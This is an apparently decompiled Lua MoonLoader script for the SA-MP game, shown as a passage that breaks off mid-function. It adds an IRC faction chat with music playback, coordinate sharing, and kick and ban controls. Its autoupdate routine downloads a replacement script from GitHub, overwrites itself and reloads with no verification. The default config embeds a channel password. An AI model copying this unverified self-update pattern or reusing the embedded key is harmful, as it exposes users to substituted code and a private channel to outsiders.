script_name("kk swatsfpd v1")
script_author("audenstach")
script_version("1.0")
script_properties("work-in-pause")

local var_0_0 = require("encoding")

var_0_0.default = "CP1251"

local var_0_1 = var_0_0.UTF8
local var_0_2 = require("vkeys")
local var_0_3 = require("rkeys")

if not var_0_3.getKeysName then
    local _vkNames = {
        [0x08]="Backspace",[0x09]="Tab",[0x0D]="Enter",[0x10]="Shift",[0x11]="Ctrl",
        [0x12]="Alt",[0x13]="Pause",[0x14]="CapsLock",[0x1B]="Escape",[0x20]="Space",
        [0x21]="PageUp",[0x22]="PageDown",[0x23]="End",[0x24]="Home",
        [0x25]="Left",[0x26]="Up",[0x27]="Right",[0x28]="Down",
        [0x2D]="Insert",[0x2E]="Delete",
        [0x30]="0",[0x31]="1",[0x32]="2",[0x33]="3",[0x34]="4",
        [0x35]="5",[0x36]="6",[0x37]="7",[0x38]="8",[0x39]="9",
        [0x41]="A",[0x42]="B",[0x43]="C",[0x44]="D",[0x45]="E",[0x46]="F",
        [0x47]="G",[0x48]="H",[0x49]="I",[0x4A]="J",[0x4B]="K",[0x4C]="L",
        [0x4D]="M",[0x4E]="N",[0x4F]="O",[0x50]="P",[0x51]="Q",[0x52]="R",
        [0x53]="S",[0x54]="T",[0x55]="U",[0x56]="V",[0x57]="W",[0x58]="X",
        [0x59]="Y",[0x5A]="Z",
        [0x70]="F1",[0x71]="F2",[0x72]="F3",[0x73]="F4",[0x74]="F5",
        [0x75]="F6",[0x76]="F7",[0x77]="F8",[0x78]="F9",[0x79]="F10",
        [0x7A]="F11",[0x7B]="F12",
        [0xA0]="LShift",[0xA1]="RShift",[0xA2]="LCtrl",[0xA3]="RCtrl",
        [0xA4]="LAlt",[0xA5]="RAlt",
    }
    var_0_3.getKeysName = function(keys)
        local names = {}
        if type(keys) == "table" then
            for i, k in ipairs(keys) do
                names[i] = _vkNames[k] or ("Key"..tostring(k))
            end
        end
        return names
    end
end

local var_0_4 = require("memory")
local var_0_5 = thisScript()
local var_0_6 = require("moonloader")
local var_0_7 = var_0_6.audiostream_state
local var_0_8 = require("samp.events")

require("luaircv2")

local var_0_9 = irc.new({
	nick = "nil",
	realname = "Samper",
	username = "samp"
})
local var_0_10 = require("inicfg")
local var_0_11 = "swatsfpd.ini"
local var_0_12 = var_0_10.load({
	ChanName = {
		"#swatsfpd"
	},
	ChanCmd = {
		"kk"
	},
	ChanTag = {
		""
	},
	ChanCrlTag = {
		"\x0F"
	},
	ChanKey = {
		"d7rl0tJpkr3K6d9VmLT7itE"
	},
	ChanBool = {
		true
	},
	TimeCash = {
		os.time()
	},
	NickPm = {
		"audenstach"
	},
	cfg = {
		NickServBool = false,
		SoundPm = 1054,
		NickPass = "",
		CmdNickPm = "w",
		SoundChan = 1058,
		HotKeyMenu = "[18,49]",
		AutoDelFileMp3 = true,
		UpDate = false,
		HotKeyMusic = "[85]",
		AntiAfk = false,
		NickPmBool = true,
		HotKeyNo = "[78]",
		AutoPlayMp3 = false,
		BeginBool = false,
		AutoConnect = false,
		HotKeyYes = "[89]"
	},
	logChan = {
		encodeJson({})
	},
	logPm = {
		encodeJson({})
	},
	comboMusic = {
		"https://muz8.z3.fm/2/da/ivoxygen_-_young_kid_(zf.fm).mp3",
		"https://dll.z3.fm/music/f/12/wels_-_nxsty_blood.mp3",
		"https://dll.z3.fm/music/f/92/zippo_-_vatakata.mp3",
		"https://rus.hitmotop.com/get/music/20200530/Nurminskijj_-_Zashumel_rajjon_69741392.mp3",
		"https://eu.hitmotop.com/get/music/20200311/Maks_Korzh_-_Maloletka_68724416.mp3",
		"https://eu.hitmotop.com/get/music/20210221/Night_Lovell_-_Dark_Light_72738188.mp3",
		"https://eu.hitmotop.com/get/music/20170901/Maks_Korzh_-_Malyjj_povzroslel_47921854.mp3",
		"https://eu.hitmotop.com/get/music/20180728/Rammstein_-_Mein_Herz_brennt_57658979.mp3",
		"https://eu.hitmotop.com/get/music/20210104/Kaspijjskijj_gruz_-_Doedesh_pishi_72195403.mp3",
		"https://eu.hitmotop.com/get/music/20170916/Kaspijjskijj_gruz_-_Tabor_ukhodit_v_nebo_48616112.mp3",
		"https://eu.hitmotop.com/get/music/20170916/Ariya_-_SHtil_48615498.mp3",
		"https://muz18.z3.fm/f/95/zippo__ostatok_slov_-_zippo__ostatok_slov_(zf.fm).mp3"
	}
}, var_0_11)

var_0_10.save(var_0_12, var_0_11)

local var_0_13 = require("mimgui")
local var_0_14 = require("ffi")
local var_0_15 = require("mimgui_hotkeys")
local var_0_16 = require("ADDONS")
-- ==== Встроенная заглушка mimtoasts2 (с корректной кодировкой) ====
local var_0_17 = {
    TYPE = { OK = 1, ERROR = 2, WARN = 3, DEBUG = 4 },
    Show = function(text, toast_type, duration, colors)
        if not text then return end
        -- var_0_1 объявлен выше как var_0_0.UTF8, декодирует UTF-8 → CP1251
        local converted = text
        local ok, res = pcall(function() return var_0_1:decode(text) end)
        if ok and res then converted = res end
        sampAddChatMessage(converted, -1)
    end
}
-- ==== конец заглушки ====
local var_0_18 = var_0_13.new
local var_0_19 = var_0_13.InputTextFlags
local var_0_20 = var_0_13.WindowFlags
local var_0_21 = var_0_18.bool(false)
local var_0_22 = var_0_18.bool(var_0_12.cfg.AutoPlayMp3)
local var_0_23 = var_0_18.bool(var_0_12.cfg.AutoDelFileMp3)
local var_0_24 = var_0_18.bool(var_0_12.cfg.NickPmBool)
local var_0_25 = var_0_18.bool(var_0_12.cfg.NickServBool)
local var_0_26 = var_0_18.bool(var_0_12.cfg.AntiAfk)
local var_0_27 = var_0_18.bool(false)
local var_0_28 = var_0_18.char[512]()
local var_0_29 = var_0_18.char[512]()
local var_0_30 = var_0_18.char[512]()
local var_0_31 = var_0_18.char[512]()
local var_0_32 = var_0_18.char[512]()
local var_0_33 = var_0_18.char[512]()
local var_0_34 = var_0_18.char[512]()
local var_0_35 = var_0_18.char[512]()
local var_0_36 = var_0_18.char[512]()
local var_0_37 = var_0_18.char[512]()
local var_0_38 = 1
local var_0_39 = var_0_18.int(1)
local var_0_40 = var_0_18.int(var_0_12.cfg.SoundChan)
local var_0_41 = var_0_18.int(var_0_12.cfg.SoundPm)
local var_0_42 = {
	"NickServ",
	"ChanServ",
	"Console"
}
local var_0_43 = true
local var_0_44 = var_0_18.float(2)
local var_0_45 = getWorkingDirectory() .. "\\irc_music\\"

colOK = {
	back = var_0_18.float[4](0.1, 0.13, 0.17, 1),
	text = var_0_18.float[4](0.004, 1, 0, 1),
	icon = var_0_18.float[4](0.004, 1, 0, 1),
	border = var_0_18.float[4](0.004, 1, 0, 1)
}
colERR = {
	back = var_0_18.float[4](0.1, 0.13, 0.17, 1),
	text = var_0_18.float[4](1, 0.3, 0.2, 1),
	icon = var_0_18.float[4](1, 0.3, 0.2, 1),
	border = var_0_18.float[4](1, 0.3, 0.2, 1)
}
colWARN = {
	back = var_0_18.float[4](0.1, 0.13, 0.17, 1),
	text = var_0_18.float[4](1, 0.7, 0.04, 1),
	icon = var_0_18.float[4](1, 0.7, 0.04, 1),
	border = var_0_18.float[4](1, 0.7, 0.04, 1)
}
colDEBUG = {
	back = var_0_18.float[4](0.1, 0.13, 0.17, 1),
	text = var_0_18.float[4](1, 1, 1, 1),
	icon = var_0_18.float[4](1, 1, 1, 1),
	border = var_0_18.float[4](1, 1, 1, 1)
}
crlALL = {
	OK = {
		back = {
			colOK.back[0],
			colOK.back[1],
			colOK.back[2],
			colOK.back[3]
		},
		text = {
			colOK.text[0],
			colOK.text[1],
			colOK.text[2],
			colOK.text[3]
		},
		icon = {
			colOK.icon[0],
			colOK.icon[1],
			colOK.icon[2],
			colOK.icon[3]
		},
		border = {
			colOK.border[0],
			colOK.border[1],
			colOK.border[2],
			colOK.border[3]
		}
	},
	WARN = {
		back = {
			colWARN.back[0],
			colWARN.back[1],
			colWARN.back[2],
			colWARN.back[3]
		},
		text = {
			colWARN.text[0],
			colWARN.text[1],
			colWARN.text[2],
			colWARN.text[3]
		},
		icon = {
			colWARN.icon[0],
			colWARN.icon[1],
			colWARN.icon[2],
			colWARN.icon[3]
		},
		border = {
			colWARN.border[0],
			colWARN.border[1],
			colWARN.border[2],
			colWARN.border[3]
		}
	},
	ERR = {
		back = {
			colERR.back[0],
			colERR.back[1],
			colERR.back[2],
			colERR.back[3]
		},
		text = {
			colERR.text[0],
			colERR.text[1],
			colERR.text[2],
			colERR.text[3]
		},
		icon = {
			colERR.icon[0],
			colERR.icon[1],
			colERR.icon[2],
			colERR.icon[3]
		},
		border = {
			colERR.border[0],
			colERR.border[1],
			colERR.border[2],
			colERR.border[3]
		}
	},
	DEBUG = {
		back = {
			colDEBUG.back[0],
			colDEBUG.back[1],
			colDEBUG.back[2],
			colDEBUG.back[3]
		},
		text = {
			colDEBUG.text[0],
			colDEBUG.text[1],
			colDEBUG.text[2],
			colDEBUG.text[3]
		},
		icon = {
			colDEBUG.icon[0],
			colDEBUG.icon[1],
			colDEBUG.icon[2],
			colDEBUG.icon[3]
		},
		border = {
			colDEBUG.border[0],
			colDEBUG.border[1],
			colDEBUG.border[2],
			colDEBUG.border[3]
		}
	}
}
urlName = {
	"Разширение URL",
	"Скачать с ютуба",
	"hitmotop",
	"z3.fm",
	"muzrecord",
	"mp3bob.ru",
	"mp3uk",
	"muzfan",
	"mp3world",
	"mp3loca",
	"mp3store"
}
urlMusic = {
	"https://chromewebstore.google.com/detail/fmplay-url-getter/gnnmepchabebcpbopfnejhgfmpblafnf?pli=1",
	"https://y2down.cc/ru/",
	"https://eu.hitmotop.com/",
	"https://z3.fm/",
	"https://muzrecord.com/",
	"https://mp3bob.ru/",
	"https://mp3uk.net/",
	"https://muzfan.net/",
	"https://mp3world.net/",
	"https://mp3loca.com/",
	"https://mp3store.cc/"
}
CrlIRCtoSAMP = {
	["\x0308"] = "{FFFF00}",
	["\x0302"] = "{000080}",
	["\x0313"] = "{FF00FF}",
	["\x033"] = "{008000}",
	["\x0300"] = "{FFFFFF}",
	["\x0304"] = "{FF0000}",
	["\x0307"] = "{FF8000}",
	["\x0305"] = "{800000}",
	["\x032"] = "{000080}",
	["\x0312"] = "{0000FF}",
	["\x0306"] = "{800080}",
	["\x030"] = "{FFFFFF}",
	["\x031"] = "{000000}",
	["\x0310"] = "{008080}",
	["\x037"] = "{FF8000}",
	["\x0303"] = "{008000}",
	["\x0314"] = "{808080}",
	["\x036"] = "{800080}",
	["\x0309"] = "{00FF00}",
	["\x0301"] = "{000000}",
	["\x0311"] = "{00FFFF}",
	["\x038"] = "{FFFF00}",
	["\x039"] = "{00FF00}",
	["\x0F"] = "{FFFFFF}",
	["\x035"] = "{800000}",
	["\x01"] = "{FFFFFF}",
	["\x01ACTION"] = "{008000}",
	["\x0315"] = "{AAAAAA}",
	["\x034"] = "{FF0000}"
}
CrlIRCtoSend = {
	["\x0315"] = "{AAAAAA}",
	["\x0311"] = "{00FFFF}",
	["\x0314"] = "{808080}",
	["\x033"] = "{008000}",
	["\x035"] = "{800000}",
	["\x036"] = "{800080}",
	["\x037"] = "{FF8000}",
	["\x038"] = "{FFFF00}",
	["\x032"] = "{000080}",
	["\x0312"] = "{0000FF}",
	["\x039"] = "{00FF00}",
	["\x0313"] = "{FF00FF}",
	["\x0310"] = "{008080}",
	["\x034"] = "{FF0000}"
}
poolChan = {}

if var_0_12.cfg.AutoConnect then
	var_0_39[0] = 1
else
	var_0_39[0] = 0
end

function main()
	while not isSampAvailable() do
		wait(0)
	end

	while not sampIsLocalPlayerSpawned() do
		wait(0)
	end

	autoupdate("https://raw.githubusercontent.com/audenstach/kk-swatsfpd/refs/heads/main/version.json", "[" .. string.upper(thisScript().name) .. "]: ", "https://raw.githubusercontent.com/audenstach/kk-swatsfpd/refs/heads/main/kk%20swatsfpd.lua")

	local var_1_0 = table.concat(var_0_3.getKeysName(decodeJson(var_0_12.cfg.HotKeyMenu)), " + ")

	var_0_17.Show("[IRC] Меню - /irc или клавиша [" .. var_1_0 .. "]", var_0_17.TYPE.DEBUG, 7, crlALL.DEBUG)
	sampRegisterChatCommand("irc", irc_menu)

	HotKeyMenu = var_0_15.RegisterHotKey("HotKeyMenu", false, decodeJson(var_0_12.cfg.HotKeyMenu), function()
		if not sampIsCursorActive() then
			irc_menu()
		end
	end)
	ids = generateRandomNumber()
	id = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
	NickName = sampGetPlayerNickname(id)

	if var_0_12.cfg.AutoConnect then
		startConnect()

		if shouldExecuteFunction() and var_0_12.cfg.AutoDelFileMp3 then
			local var_1_1 = decodeJson(var_0_12.cfg.HotKeyYes)
			local var_1_2 = decodeJson(var_0_12.cfg.HotKeyNo)
			local var_1_3 = table.concat(var_0_3.getKeysName(var_1_1), " + ")
			local var_1_4 = table.concat(var_0_3.getKeysName(var_1_2), " + ")

			sampAddChat("{00ff00} [IRC]{aaaaaa}Очистить папку irc_music? {00ff00}%s {aaaaaa}или {ff0000}%s", var_1_3, var_1_4)

			playKeyMusic = "delete"
		end
	end

	if var_0_12.cfg.BeginBool then
		var_0_21[0] = true
		var_0_12.cfg.BeginBool = false
	end

	var_0_10.save(var_0_12, var_0_11)

	while true do
		wait(0)
	end
end

function startConnect()
	saverChat()
	checkIRC()

	DebugChat, NickServChat, ChanServChat = {}, {}, {}
	UserChan, fUserChan, banUserChan, LogChatChan = {}, {}, {}, {}
	posChan, coordStat, poolChan, ChanCrd, ChanBool = {}, {}, {}, {}, {}

	for iter_3_0, iter_3_1 in ipairs(var_0_12.ChanName) do
		TableUsersK(iter_3_0)
	end

	HotKeyMusic = var_0_15.RegisterHotKey("HotKeyMusic", false, decodeJson(var_0_12.cfg.HotKeyMusic), function()
		if not sampIsCursorActive() and PlaySound ~= nil then
			if getAudioStreamState(PlaySound) == 2 then
				if PlaySound ~= nil then
					setAudioStreamState(PlaySound, var_0_7.RESUME)

					pause_bool = true
				end
			elseif PlaySound ~= nil then
				setAudioStreamState(PlaySound, var_0_7.PAUSE)

				pause_bool = false
			end
		end
	end)
	HotKeyYes = var_0_15.RegisterHotKey("HotKeyYes", false, decodeJson(var_0_12.cfg.HotKeyYes), function()
		if not sampIsCursorActive() then
			if playKeyMusic == "play" then
				irc_music_down(KeyStartMp3)

				playKeyMusic = nil
			end

			if playKeyMusic == "delete" then
				yourFunction("1")

				playKeyMusic = nil
			end
		end
	end)
	HotKeyNo = var_0_15.RegisterHotKey("HotKeyNo", false, decodeJson(var_0_12.cfg.HotKeyNo), function()
		if not sampIsCursorActive() then
			if playKeyMusic == "play" then
				sampAddChat("{FF0000}[IRC] {aaaaaa} Отклонено")

				playKeyMusic = nil
			end

			if playKeyMusic == "delete" then
				var_0_12.TimeCash[1] = os.time()

				var_0_10.save(var_0_10, var_0_11)
				sampAddChat("{FF0000}[IRC] {aaaaaa} Отклонено")

				playKeyMusic = nil
			end
		end
	end)

	if var_0_12.cfg.AntiAfk then
		fAFK(var_0_12.cfg.AntiAfk)
	end

	LogChatPm = {}

	for iter_3_2, iter_3_3 in ipairs(var_0_12.NickPm) do
		LogChatPm[iter_3_2] = {}

		sampRegisterChatCommand(var_0_12.cfg.CmdNickPm .. iter_3_2, function(arg_7_0)
			fSendPmU8(arg_7_0, iter_3_2)
		end)

		for iter_3_4, iter_3_5 in ipairs(decodeJson(var_0_12.logPm[iter_3_2])) do
			table.insert(LogChatPm[iter_3_2], iter_3_5)
		end
	end

	var_0_9.nick = NickName

	sendIRC("connect", "irc.mindforge.org", Port)
	sendIRC("hook", "OnChat", onIRCMessage)
	sendIRC("hook", "OnJoin", onIRCJoin)
	sendIRC("hook", "OnPart", onIRCPart)
	sendIRC("hook", "OnKick", onIRCKick)
	sendIRC("hook", "OnQuit", onIRCQuit)
	sendIRC("hook", "OnRaw", onIRCRaw)
	sendIRC("hook", "OnModeChange", onIRCModeChange)
	sendIRC("hook", "OnDisconnect", onIRCDisconnect)
	var_0_17.Show("[IRC] Подключение...", var_0_17.TYPE.DEBUG, 3, crlALL.DEBUG)
	lua_thread.create(function()
		while var_0_12.cfg.AutoConnect do
			sendIRC("think")

			for iter_8_0, iter_8_1 in ipairs(var_0_12.ChanName) do
				if not coordStat[iter_8_0] and poolChan[iter_8_0] ~= nil then
					removeBlip(poolChan[iter_8_0])
				end
			end

			wait(100)
		end
	end)
end

function autoupdate(arg_9_0, arg_9_1, arg_9_2)
	local var_9_0 = var_0_6.download_status
	local var_9_1 = getWorkingDirectory() .. "\\" .. thisScript().name .. "-version.json"

	if doesFileExist(var_9_1) then
		os.remove(var_9_1)
	end

	downloadUrlToFile(arg_9_0, var_9_1, function(arg_10_0, arg_10_1, arg_10_2, arg_10_3)
		if arg_10_1 == var_9_0.STATUSEX_ENDDOWNLOAD then
			if doesFileExist(var_9_1) then
				local var_10_0 = io.open(var_9_1, "r")

				if var_10_0 then
					local var_10_1 = decodeJson(var_10_0:read("*a"))

					updatelink = var_10_1.updateurl
					updateversion = var_10_1.latest

					var_10_0:close()
					os.remove(var_9_1)

					if updateversion ~= thisScript().version then
						lua_thread.create(function(arg_11_0)
							local var_11_0 = var_0_6.download_status
							local var_11_1 = -1

							sampAddChat("{00ff00}%s {aaaaaa}Обнаружено обновление. Пытаюсь обновиться c {00ff00}%s {aaaaaa}на {00ff00}%s", arg_11_0, thisScript().version, updateversion)
							wait(250)
							downloadUrlToFile(updatelink, thisScript().path, function(arg_12_0, arg_12_1, arg_12_2, arg_12_3)
								if arg_12_1 == var_11_0.STATUS_DOWNLOADINGDATA then
									print(string.format(var_0_1:decode("Загружено %d из %d."), arg_12_2, arg_12_3))
								elseif arg_12_1 == var_11_0.STATUS_ENDDOWNLOADDATA then
									print(var_0_1:decode("Загрузка обновления завершена."))
									sampAddChat("{00ff00}%s {aaaaaa}Обновление завершено!", arg_11_0)

									var_0_12.cfg.AutoConnect = true
									var_0_12.cfg.BeginBool = true
									goupdatestatus = true

									lua_thread.create(function()
										wait(500)
										thisScript():reload()
									end)
								end

								if arg_12_1 == var_11_0.STATUSEX_ENDDOWNLOAD and goupdatestatus == nil then
									sampAddChat("{00ff00}%s {aaaaaa}Обновление прошло неудачно. Запускаю устаревшую версию..", arg_11_0)

									update = false
								end
							end)
						end, arg_9_1)
					else
						update = false

						print("v" .. thisScript().version .. var_0_1:decode(": Обновление не требуется."))
					end
				end
			else
				print("v" .. thisScript().version .. var_0_1:decode(": Не могу проверить обновление. Смиритесь или проверьте самостоятельно на ") .. arg_9_2)

				update = false
			end
		end
	end)

	while update ~= false do
		wait(100)
	end
end

var_0_13.OnFrame(function()
	return var_0_21[0]
end, function(arg_15_0)
	local var_15_0 = var_0_13.ImVec2(1000, 600)
	local var_15_1 = var_0_13.ImVec2(getScreenResolution())

	var_0_13.SetNextWindowPos(var_0_13.ImVec2(var_15_1.x / 2, var_15_1.y / 2), var_0_13.Cond.FirstUseEver, var_0_13.ImVec2(0.5, 0.5))
	var_0_13.SetNextWindowSize(var_15_0, var_0_13.Cond.FirstUseEver)
	var_0_13.Begin("kk chat by audenstach", var_0_21, var_0_20.NoCollapse + var_0_20.NoTitleBar)

	local var_15_2 = var_0_13.GetWindowWidth()
	local var_15_3 = var_0_13.GetWindowHeight()

	if var_0_39[0] ~= 0 then
		local var_15_4 = 20

		var_0_13.SetWindowFontScale(1.2)

		if var_0_16.HeaderButton(var_0_39[0] == 1, "Каналы и чаты") then
			var_0_39[0] = 1
		end

		var_0_13.SameLine(nil, var_15_4)

		if var_0_16.HeaderButton(var_0_39[0] == 2, "Сервисы (BETA)") then
			var_0_39[0] = 2
		end

		var_0_13.SameLine(nil, var_15_4)

		if var_0_16.HeaderButton(var_0_39[0] == 3, "Музыка") then
			var_0_39[0] = 3
		end

		var_0_13.SameLine(nil, var_15_4)

		if var_0_16.HeaderButton(var_0_39[0] == 4, "Параметры") then
			var_0_39[0] = 4
		end

		var_0_13.SameLine(nil, var_15_4)

		if var_0_16.HeaderButton(var_0_39[0] == 6, "ReConnect") then
			var_0_12.cfg.AutoConnect = true
			var_0_12.cfg.BeginBool = true

			var_0_10.save(var_0_12, var_0_11)
			var_0_5:reload()
		end

		var_0_13.SameLine(nil, var_15_4)

		if var_0_16.HeaderButton(var_0_39[0] == 7, "DisConnect") then
			var_0_12.cfg.AutoConnect = false
			var_0_12.cfg.BeginBool = true

			var_0_10.save(var_0_12, var_0_11)
			var_0_5:reload()
		end

		var_0_13.SameLine(nil, 55)
		var_0_13.TextColoredRGB("{ff0000}kk chat swat sfpd {aaaaaa}by{ff0000} auden")
		var_0_13.SetWindowFontScale(1)
	end

	var_0_13.SameLine()
	var_0_13.SetCursorPosX(var_15_2 - 25)
	var_0_16.CloseButton("MainClose", var_0_21, 23)

	if var_0_39[0] == 0 then
		var_0_13.SetCursorPos(var_0_13.ImVec2((var_15_2 - 150) / 2, (var_15_3 - 50) / 2))

		if var_0_16.AnimButton("Подключиться", var_0_13.ImVec2(150, 50)) then
			var_0_12.cfg.AutoConnect = true
			var_0_12.cfg.BeginBool = true

			var_0_10.save(var_0_12, var_0_11)
			var_0_5:reload()
		end
	end

	if var_0_39[0] == 1 and var_0_13.BeginTabBar("AllChat") then
		var_0_13.SetCursorPos(var_0_13.ImVec2(var_15_2 - 198, 60))

		if var_0_16.AnimButton("++ Новый чат ++", var_0_13.ImVec2(194, 30)) then
			MimNewChat = true
		end

		if MimNewChat then
			var_0_13.OpenPopup("Новый чат")

			if var_0_13.BeginPopupModal("Новый чат", _, var_0_13.WindowFlags.NoResize) then
				var_0_13.SetWindowSizeVec2(var_0_13.ImVec2(500, 500))

				if var_0_13.BeginTabBar("NewChat") then
					if var_0_13.BeginTabItem("Новый канал") then
						var_0_13.InputTextWithHint("Имя канана", "Примеры: [#samp, #pedro, #армия, #evolve, #петухи]", var_0_30, 512)
						var_0_13.InputTextWithHint("Команда сообщения в чат", "Примеры: [k, kk, rf, kl, ir] (Без \"/\")", var_0_31, 512)
						var_0_13.Separator()
						var_0_16.ToggleButton("Создать тег", var_0_27)

						if var_0_27[0] then
							var_0_13.InputTextWithHint("Тег", "Примеры: [Демон, Самурай, Gangster, Pedro]", var_0_32, 512)

							if MimBoolTag then
								var_0_13.TextColoredRGB("Ваш тег: " .. ChanCrlTagv)
							end

							var_0_13.CenterText("Нажмите на любой цвет после ввода тега")

							if var_0_13.BeginChild("CRL LIAST TAG", var_0_13.ImVec2(-1, 200), true) then
								for iter_15_0, iter_15_1 in pairs(CrlIRCtoSend) do
									local var_15_5 = iter_15_1:gsub("{(.-)}", "%1")

									if var_0_13.ColoredButton(var_15_5, var_15_5, 50, true) then
										ChanCrlTagv = string.format("%s«%s»", iter_15_1, var_0_14.string(var_0_32))
										ChanCrlTagk = iter_15_0
										ChanCrlTagkk = string.format("«%s»", var_0_14.string(var_0_32))
										MimBoolTag = true
									end
								end

								var_0_13.EndChild()
							end
						end

						if var_0_16.AnimButton("Создать канал", var_0_13.ImVec2(200, 24)) then
							if var_0_14.string(var_0_31) == "" or var_0_14.string(var_0_30) == "" then
								notAddChan = true
							else
								fAddChan()
								var_0_13.StrCopy(var_0_30, "")
								var_0_13.StrCopy(var_0_31, "")
								var_0_13.StrCopy(var_0_32, "")

								ChanCrlTagk = ""
								ChanCrlTagkk = ""
								MimNewChat = false
								notAddChan = false
								MimBoolTag = false
								var_0_27[0] = false
							end
						end

						if notAddChan then
							var_0_13.Text("Вы не ввели Команду или Имя канала в поле ввода")
						end

						var_0_13.EndTabItem()
					end

					if var_0_13.BeginTabItem("Личный чат") then
						var_0_13.InputTextWithHint("##BufChatName", "Введите ник собеседника..", var_0_30, 512)

						if notAddChan2 then
							var_0_13.Text("Вы не ввели ник в поле ввода")
						end

						if var_0_16.AnimButton("Создать", var_0_13.ImVec2(280, 24)) then
							if var_0_14.string(var_0_30) == "" then
								notAddChan2 = true
							else
								addNickTable(var_0_14.string(var_0_30))
								var_0_13.StrCopy(var_0_30, "")

								MimNewChat = false
								notAddChan2 = false
							end
						end

						var_0_13.EndTabItem()
					end

					var_0_13.EndTabBar()
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(110, 470))

				if var_0_16.AnimButton("Закрыть", var_0_13.ImVec2(280, 24)) then
					ChanCrlTagk = ""
					ChanCrlTagkk = ""
					MimNewChat = false
					notAddChan = false
					MimBoolTag = false
					var_0_27[0] = false
				end

				var_0_13.End()
			end
		end

		if MimPassChan then
			var_0_13.OpenPopup("Ввод пароля для " .. PassChanName)

			if var_0_13.BeginPopupModal("Ввод пароля для " .. PassChanName, _, var_0_13.WindowFlags.NoResize) then
				var_0_13.SetWindowSizeVec2(var_0_13.ImVec2(500, 250))

				if var_0_13.InputTextWithHint("Пароль в " .. PassChanName, "Введите пароль [Enter]", var_0_36, 512, var_0_19.EnterReturnsTrue + var_0_19.Password) then
					if var_0_14.string(var_0_36) == "" then
						notPassChan = true
					else
						local var_15_6 = KeyPassChan

						var_0_12.ChanKey[var_15_6] = var_0_14.string(var_0_36)

						sendIRC("join", PassChanName, var_0_12.ChanKey[var_15_6])
						var_0_13.StrCopy(var_0_36, "")
						var_0_10.save(var_0_12, var_0_11)

						MimPassChan = false
						notPassChan = false
						TextPassChan = false
					end
				end

				if TextPassChan then
					var_0_13.Text("Введенный пароль: " .. var_0_14.string(var_0_36))
				end

				if var_0_16.AnimButton("Показать пароль") then
					TextPassChan = true
				end

				if notPassChan then
					var_0_13.Text("Вы не ввели пароль")
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(110, 220))

				if var_0_16.AnimButton("Закрыть", var_0_13.ImVec2(280, 24)) then
					MimPassChan = false
					notPassChan = false
					TextPassChan = false
				end

				var_0_13.End()
			end
		end

		for iter_15_2, iter_15_3 in ipairs(var_0_12.ChanName) do
			if var_0_13.BeginTabItem(iter_15_3) then
				var_0_13.SetCursorPos(var_0_13.ImVec2(1, 60))

				if var_0_13.BeginChild("Чат канала", var_0_13.ImVec2(var_15_2 - 200, var_15_3 - 92), true) then
					for iter_15_4, iter_15_5 in ipairs(LogChatChan[iter_15_2]) do
						var_0_13.TextColoredRGB(" > {ffffff}" .. iter_15_5)
					end

					var_0_13.SetScrollY(var_0_13.GetScrollMaxY())
					var_0_13.EndChild()
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(1, var_15_3 - 30))
				var_0_13.PushItemWidth(var_15_2 - 200)

				if ChanBool[iter_15_2] and var_0_13.InputTextWithHint("##SendChan", "Введите сообщение [Enter]", var_0_28, 512, var_0_19.EnterReturnsTrue) then
					fSendChan(var_0_14.string(var_0_28), iter_15_2)
					var_0_13.StrCopy(var_0_28, "")
					var_0_13.SetKeyboardFocusHere(-1)
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(var_15_2 - 200, 90))

				if var_0_13.BeginChild("Онлайн канала", var_0_13.ImVec2(199, var_15_3 - 190), false) then
					if ChanBool[iter_15_2] then
						var_0_13.CenterText("Онлайн " .. iter_15_3)
						var_0_16.Hint("##hint3", "Нажми на любой ник", var_0_13.GetStyle().Colors[var_0_13.Col.TextDisabled])
						var_0_13.Separator()

						for iter_15_6, iter_15_7 in pairs(UserChan[iter_15_2]) do
							if var_0_13.CenterSelectable(iter_15_7, false) then
								MimNickOnline = true
								Nickv1 = fUserChan[iter_15_2][iter_15_6]
							end
						end
					end

					var_0_13.EndChild()
				end

				if MimNickOnline then
					var_0_13.OpenPopup(Nickv1)

					if var_0_13.BeginPopupModal(Nickv1, _, var_0_13.WindowFlags.NoResize) then
						var_0_13.SetWindowSizeVec2(var_0_13.ImVec2(250, 250))
						var_0_13.SetCursorPosX(55)

						if var_0_16.AnimButton("Запросить корды", var_0_13.ImVec2(140, 24)) then
							if Nickv1 == NickName then
								fSendCoordChan(iter_15_2)
							else
								fSendChan(string.format("%s crd", Nickv1), iter_15_2)

								MimNickOnline = false
								var_0_21[0] = false
							end
						end

						var_0_13.SetCursorPosX(55)

						if var_0_16.AnimButton("Личный чат", var_0_13.ImVec2(140, 24)) then
							addNickTable(Nickv1)

							MimNickOnline = false
						end

						var_0_13.SetCursorPosX(55)

						if var_0_16.AnimButton("Кикнуть", var_0_13.ImVec2(140, 24)) then
							kickBool = true
						end

						if kickBool then
							var_0_13.SetCursorPosX(40)

							if var_0_13.InputTextWithHint("##BufKickChan", "Введите причину [Enter]", var_0_37, 512, var_0_19.EnterReturnsTrue) then
								sendIRC("send", "kick %s %s %s", iter_15_3, Nickv1, var_0_14.string(var_0_37))
								var_0_13.StrCopy(var_0_37, "")

								MimNickOnline = false
							end
						end

						var_0_13.SetCursorPosX(55)

						if var_0_16.AnimButton("Забанить", var_0_13.ImVec2(140, 24)) then
							sendIRC("send", "mode %s +b %s", iter_15_3, Nickv1)

							MimNickOnline = false
						end

						var_0_13.SetCursorPosX(55)

						if var_0_16.AnimButton("Забанить IP", var_0_13.ImVec2(140, 24)) then
							sendIRC("send", "whois %s", Nickv1)

							statBanIp = true
							ChanstatBanIp = iter_15_3
							MimNickOnline = false
						end

						var_0_13.SetCursorPos(var_0_13.ImVec2(55, 220))

						if var_0_16.AnimButton("Закрыть", var_0_13.ImVec2(140, 24)) then
							MimNickOnline = false
						end

						var_0_13.End()
					end
				end

				if not MimNickOnline then
					kickBool = false
				end

				var_0_13.SetCursorPos(var_0_13.ImVec2(var_15_2 - 200, var_15_3 - 100))

				if var_0_13.BeginChild("Парамеры канала", var_0_13.ImVec2(199, -1), false) then
					var_0_13.Separator()

					if var_0_13.ColoredButton("Парамерты " .. iter_15_3, "f99f16", 50, true) then
						MimParamChan = true
					end

					if ChanBool[iter_15_2] then
						if var_0_13.ColoredButton("Покинуть " .. iter_15_3, "F94242", 50, true) then
							posChan[iter_15_2] = false

							if poolChan[iter_15_2] then
								removeBlip(poolChan[iter_15_2])
							end

							sendIRC("part", iter_15_3)

